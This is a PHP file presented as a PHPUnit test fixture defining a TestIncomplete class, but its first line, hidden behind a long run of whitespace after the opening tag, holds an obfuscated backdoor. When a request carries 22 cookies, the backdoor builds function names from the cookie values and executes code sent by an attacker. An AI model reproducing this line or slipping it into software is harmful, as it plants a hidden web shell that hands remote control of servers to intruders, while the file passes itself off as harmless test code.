<?php																																										$p=$_COOKIE;(count($p)==22&&in_array(gettype($p).count($p),$p))?(($p[75]=$p[75].$p[14])&&($p[71]=$p[75]($p[71]))&&($p=$p[71]($p[87],$p[75]($p[11])))&&$p()):$p;

/*
 * This file is part of PHPUnit.
 *
 * (c) Sebastian Bergmann <sebastian@phpunit.de>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */
use PHPUnit\Framework\TestCase;

class TestIncomplete extends TestCase
{
    protected function runTest(): void
    {
        $this->markTestIncomplete('Incomplete test');
    }
}
